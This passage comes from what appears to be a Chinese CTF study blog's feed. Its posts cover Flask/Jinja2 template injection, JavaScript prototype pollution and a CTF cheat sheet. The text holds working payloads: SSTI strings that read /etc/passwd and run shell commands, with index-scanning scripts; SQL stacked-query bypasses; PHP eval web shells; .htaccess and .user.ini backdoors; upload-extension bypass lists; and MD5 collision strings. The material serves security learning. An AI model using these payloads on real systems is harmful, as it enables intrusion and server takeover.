title="文件读取"></a>文件读取</h4><p>python2——file类：</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125;</code></pre><p>Python3——使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。首先编写脚本遍历目标Python环境中 <code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类索引号：</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;FileLoader&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")&#125;&#125;</code></pre><h4 id="内建函数-eval-执行命令"><a href="#内建函数-eval-执行命令" class="headerlink" title="内建函数 eval 执行命令"></a>内建函数 eval 执行命令</h4><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li></ul><p>首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;eval&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;</code></pre><p>使用eval函数执行命令也是调用的os模块</p><p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;os.py&#39; in res.text:        print(i)</code></pre><p>随便挑一个类构造payload执行命令即可：</p><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;</code></pre><p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p><p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;popen&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre><p>还有一些内容，这里就不搬过来了，可以自行查看<a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p>这里还是找几个靶场检验一下</p><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>题目源码：</p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>现在看这个题就比较清晰了，waf了config和self，但flag放在了config中，如果没有黑名单的时候，我们可以传入 config，或者传入获取，这里还要再去查一下这个config：</p><p><a href="https://zhuanlan.zhihu.com/p/24055329">Flask项目配置（Configuration） - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/andy9468/p/10870574.html">flask的配置项及获取 - 安迪9468 - 博客园 (cnblogs.com)</a></p><p>从第二篇博客中我们发现可以使用current_app：</p><pre><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>在提示中我们知道需要获取一个cookie-secret的值，我们还需要补充一些知识：</p><p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入 - Hanamizuki花水木 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/bmjoker/p/13508538.html&quot;&gt;1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://taninluv.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>原型链污染</title>
    <link href="https://taninluv.github.io/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://taninluv.github.io/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2023-11-07T08:27:38.000Z</published>
    <updated>2023-11-07T09:02:07.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JavaScript 原型链污染 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>简单来说就是：</p><ul><li><code>prototype</code> 是 <code>newClass</code> 类的一个属性</li><li><code>newClass</code> 类实例化的对象 <code>newObj</code> 不能访问 <code>prototype</code>，但可以通过<code>.__proto__</code> 来访问 <code>newClass</code> 类的 <code>prototype</code></li><li><code>newClass</code> 实例化的对象 <code>newObj</code> 的 <code>.__proto__</code> 指向 <code>newClass</code> 类的 <code>prototype</code></li></ul><h3 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h3><p>找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象 merge</li><li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li></ul><h1 id="test"><a href="#test" class="headerlink" title="test:"></a>test:</h1><pre><code>function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;</code></pre><pre><code>let o1 = &#123;&#125;let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>这里<code>__proto__</code>已经代表o2的原型，并没有被当作key，故无法污染链子</p><pre><code>let o1 = &#123;&#125;let o2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>JSON 解析的情况下，<code>__proto__</code> 会被认为是一个真正的“键名”，而不代表“原型”,此时可以造成污染。</p><h1 id="CatCTF-2022-wife"><a href="#CatCTF-2022-wife" class="headerlink" title="CatCTF 2022 wife"></a>CatCTF 2022 wife</h1><pre><code>app.post(&#39;/register&#39;, (req, res) =&gt; &#123;    let user = JSON.parse(req.body)    if (!user.username || !user.password) &#123;        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)    &#125;    if (users.filter(u =&gt; u.username == user.username).length) &#123;        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)    &#125;    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;        user.isAdmin = false        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)    &#125;    let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染    users.push(newUser)    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)&#125;)</code></pre><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign() - JavaScript | MDN (mozilla.org)</a></p><p><strong><code>Object.assign()</code></strong> 静态方法将一个或者多个<em>源对象</em>中所有<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/propertyIsEnumerable">可枚举</a>的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn">自有属性</a>复制到<em>目标对象</em>，并返回修改后的目标对象。</p><p>正常情况下是无法污染的：</p><pre><code>baseUser = &#123;    a:1&#125;user = &#123;    a:2,    b:1,    __proto__:&#123;        c:3    &#125;&#125; // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象let newUser = Object.assign(&#123;&#125;, baseUser, user)  // 无污染，结果正常console.log(newUser)  // &#123;a: 2, b: 1&#125;  // 无污染，结果正常console.log(newUser.__proto__)  // &#123;constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …&#125;</code></pre><p>但是好在后端服务器是JavaScript，我们通过post发送过去的 json是字符串，JavaScript需要通过JSON.parse()函数才能把 json字符串转成对象，如之前所说，json解析时<code>__proto__</code>能被当成真正的key</p><h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h1><p>如果遇到过滤的话：</p><p>字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 <em>replacement</em> 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。</p><p><em>replacement</em> 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 <code>$</code> 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。</p><p><img src="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/replace.png" alt="img"></p><pre><code>&#39;123&#39;.replace(&quot;2&quot;,&#39;$`&#39;);&quot;113&quot;&#39;123&#39;.replace(&quot;2&quot;,&quot;$&#39;&quot;);&quot;133&quot;</code></pre><p>这里先把匹配到的字符串替换为$`,然后由于$特殊含义，此时 $`又被替换为原位置的左侧文本，另一个同理</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原型链污染&quot;&gt;&lt;a href=&quot;#原型链污染&quot; class=&quot;headerlink&quot; title=&quot;原型链污染&quot;&gt;&lt;/a&gt;原型链污染&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/Java</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://taninluv.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Marks</title>
    <link href="https://taninluv.github.io/2023/11/01/CTF-Marks/"/>
    <id>https://taninluv.github.io/2023/11/01/CTF-Marks/</id>
    <published>2023-11-01T12:16:11.000Z</published>
    <updated>2023-12-05T07:39:54.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>show databases</p><p>show tables</p><p>当纯数字字符串是表名的时候需要加反引号:</p><p>show columns from `1919810931114514`</p><p>反引号表示内容为表明</p><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客</a></p><h5 id="1、打开句柄"><a href="#1、打开句柄" class="headerlink" title="1、打开句柄"></a>1、打开句柄</h5><pre><code class="mysql">handler handler_table open;#这里可以使用别名</code></pre><h5 id="2、查看数据"><a href="#2、查看数据" class="headerlink" title="2、查看数据"></a>2、查看数据</h5><pre><code class="mysql">handler handler_table read first;handler handler_table read next;</code></pre><p>payload:</p><pre><code>1&#39;;use supersqli;handler `1919810931114514` open as p;handler p read first;</code></pre><h2 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h2><p><a href="https://blog.csdn.net/bb15070047748/article/details/107266400">什么是MySQL的预编译？_mysql 预编译-CSDN博客</a></p><pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct flag from `1919810931114514`;&#39;);#@表示变量prepare stmt from @sql;EXECUTE stmt;#</code></pre><p>感觉像是set设置变量值然后在语句中替换，使用concat绕过关键字过滤</p><h2 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h2><p>如果没有过滤alter，把默认展示的字段名字修改，把想看的字段名字、表明等修改为默认展示的名字</p><p>将放着flag的表1919810931114514名字改成words</p><p>alter table <code>1919810931114514</code> rename to words</p><p>表里头字段名flag改成id</p><p>alter table words change flag id varchar(100)</p><ul><li><p><code>ALTER TABLE words</code> 表示您要修改的表是名为 <code>words</code> 的表。</p></li><li><pre><code>CHANGE flag id varchar(100)</code></pre><p> 是实际的修改部分。它的含义是：</p><ul><li><code>CHANGE</code> 表示您要更改一个列的属性。</li><li><code>flag</code> 是要更改的列的当前名称。</li><li><code>id</code> 是要将该列更改为的新名称。</li><li><code>varchar(100)</code> 是新的数据类型，将该列更改为 VARCHAR 类型，最大长度为 100 个字符。</li></ul></li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li>strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数</li><li>过滤了union select，我们用union all select 就可以绕过</li></ul><h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p><a href="https://blog.csdn.net/m0_63525319/article/details/127982141">sql中的无关子查询与相关子查询和集合查询详细举例说明_无关子查询和相关子查询_ctf^_^的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311030020659.png" alt="image-20231103001841549"></p><p>相当于临时新建了一个a表，username字段放入admin，password字段放入123，用来绕过其后的验证：</p><pre><code>query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#39;&quot;.$this-&gt;username.&quot;&#39; and password=&#39;&quot;.$this-&gt;password.&quot;&#39;&quot;);</code></pre><p>这里实际相当于注入了一个表</p><h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p><a href="https://blog.csdn.net/yuanxu8877/article/details/128071631">【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&lt;?= eval($_POST[1]);?&gt;&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php</code></pre><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><pre><code>&lt;FilesMatch &quot;shell&quot; &gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>将当前目录下文件名为shell的文件当成php来解析</p><pre><code>AddType application/x-httpd-php .mochu</code></pre><p>将别的后缀名文件内容解析为php程序</p><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.<a href="https://so.csdn.net/so/search?q=ini%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">ini文件</a></h2><p>具体参考<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><p>.user.ini</p><pre><code>auto_prepend_file=shell.jpg</code></pre><p>shell.jpg</p><pre><code>GIF89a&lt;?php eval($_P0ST[&#39;a&#39;]); ?&gt;</code></pre><h2 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h2><p>利用了一个Linux的目录结构特性 , 请看下面代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190907181102.png" alt="20190907181102.png"></p><p>这里访问 <code>./1.php/2.php/..</code> 代表访问 <code>2.php</code>的父目录 , 也就是访问 <code>1.php</code> 。</p><p>因此这里构造数据包时 , 可以构造如下POST数据</p><pre><code>con=&lt;?php @eval($_POST[cmd]);?&gt;&amp;file=test.php/1.php/..</code></pre><h3 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h3><pre><code>phpphp2php3php4php5pHppHp2pHp3pHp4pHp5htmlhtmphtmlphtHtmlHtmpHtmlaspaspxasaasaxashxasmxceraSpaSpxaSaaSaxaScxaShxaSmxcErjspjspajspxjswjxvjspfjtmlJSpjSpxjSpajSwjSvjSpfjHtmlasp/test.jpgasp;.jpgcer/test.jpgcer;.jpgasa/test.jpgasa;.jpgaSp/test.jpgaSp;.jpgcEr/test.jpgcEr;.jpgaSa/test.jpgaSa;.jpgjpg/xx.phpjpg/xx.pHpjpg/.phpjpg/.pHpphp.xs.aaphp2.aaphp3.aaphp4.aaphp5.aapHp.aapHp2.aapHp3.aapHp4.aaapHp5.aahtml.aahtm.aaphtml.aapht.aaaHtml.aaaHtm.aapHtml.aaphp::$DATA</code></pre><h1 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h1><h2 id="RCE-变量动态调用函数"><a href="#RCE-变量动态调用函数" class="headerlink" title="RCE-变量动态调用函数"></a>RCE-变量动态调用函数</h2><p>[buuctf-<a href="https://blog.csdn.net/xhy18634297976/article/details/123148026">CISCN 2019 初赛]Love Math（小宇特详解）_小宇特详解的博客-CSDN博客</a></p><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p><pre><code>$a=&#39;system&#39;;$a(&#39;cat/flag&#39;);payload:?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</code></pre><h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h3><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><p><a href="https://coding.tools/cn/ascii-to-hex">ASCII字符串到16进制在线转换工具 - Coding.Tools</a></p><h3 id="base-convert-函数"><a href="#base-convert-函数" class="headerlink" title="base_convert()函数"></a>base_convert()函数</h3><p>base_convert()函数能够在任意进制之间转换数字</p><p>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p><p>hex2bin&#x3D;base_convert(37907361743,10,36)</p><h3 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex()函数"></a>dechex()函数</h3><p>dechex()函数将10进制数转换为16进制的数</p><p><a href="https://www.sojson.com/hexconvert/16to10.html">十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)</a></p><h2 id="RCE-preg-replace"><a href="#RCE-preg-replace" class="headerlink" title="RCE-preg_replace"></a>RCE-preg_replace</h2><p><a href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p><p>1.&#x2F;e修饰符必不可少<br>2.你必须让 subject 中有 pattern 的匹配。<br>3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本<br>4.满足可变变量的条件</p><h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><p>?&#x2F;..&#x2F;flag &#x3D; &#x2F;..&#x2F;flag 这里的问号不会影响</p><h2 id="反序列化-POP-chains"><a href="#反序列化-POP-chains" class="headerlink" title="反序列化 POP chains"></a>反序列化 POP chains</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png" alt="image-20231110111419036"></p><p><a href="https://blog.csdn.net/cosmoslin/article/details/120297881">【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客</a></p><p><a href="https://www.php.net/manual/zh/function.popen.php">PHP: popen - Manual</a></p><pre><code>popen(string $command, string $mode): resource|false</code></pre><p>返回一个和 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 <a href="https://www.php.net/manual/zh/function.pclose.php">pclose()</a> 来关闭。此指针可以用于 <a href="https://www.php.net/manual/zh/function.fgets.php">fgets()</a>，<a href="https://www.php.net/manual/zh/function.fgetss.php">fgetss()</a> 和 <a href="https://www.php.net/manual/zh/function.fwrite.php">fwrite()</a>。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p><pre><code>&lt;?php$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);?&gt;</code></pre><p><a href="https://www.cnblogs.com/gaohj/p/3267692.html">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() - gaohj - 博客园 (cnblogs.com)</a></p><pre><code>function passthru(string $command,int[optional] $return_value)</code></pre><p>passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p><pre><code>&lt;?php        passthru(&quot;ls&quot;);?&gt;</code></pre><h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p><a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结 – fushulingのblog</a></p><blockquote><p>可以利用cve-2016-7124进行绕过，将payload里ctf后面那个1改为2就行了，因为真实的属性其实只有一个，那就是那个flag，改为2之后对象属性个数的值就大于真实的属性个数了，因此可以绕过wakeup()，</p></blockquote><h3 id="非public属性"><a href="#非public属性" class="headerlink" title="非public属性"></a>非public属性</h3><p>[BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542">极客大挑战 2019]PHP 1_buuojphp1-CSDN博客</a></p><p>区别只在于对变量名添加了标记：</p><pre><code>public无标记，变量名不变，长度不变: s:2:&quot;op&quot;;i:2;protected在变量名前添加标记%00*%00，长度+3: s:5:&quot;%00*%00op&quot;;i:2;private在变量名前添加标记%00(classname)%00，长度+2+类名长度: s:17:&quot;%00FileHandler_Z%00op&quot;;i:2;</code></pre><p>O:6:”class1”:3:{s:1:”a”;s:1:”1”;s:4:”<em>b”;s:5:”ThisB”;s:9:”class1c”;s:5:”ThisC”;}</em><br><em>对象序列化后的结构为：</em><br><em>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00</em>%00。所以，protected属性的表示方式是在变量名前加上%00*%00。c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>这里提供一些md5以后是0e开头的值：</p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><p>强碰撞：</p><pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</code></pre><pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><h2 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content()"></a>file_get_content()</h2><p>file_get_content()可以读取php:&#x2F;&#x2F;filter伪协议。</p><h1 id="python相关"><a href="#python相关" class="headerlink" title="python相关"></a>python相关</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>查看config：</p> 可以获取当前设置，如果题目是这样的：<blockquote><p>app.config [‘FLAG’] &#x3D; os.environ.pop（’FLAG’）</p></blockquote><p>可以直接访问  或者  得到 flag。</p><p>同样可以找到 config。</p><pre><code class="python">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="参考步骤"><a href="#参考步骤" class="headerlink" title="参考步骤"></a>参考步骤</h2><h3 id="图片"><a href="#图片" class="headerlink" 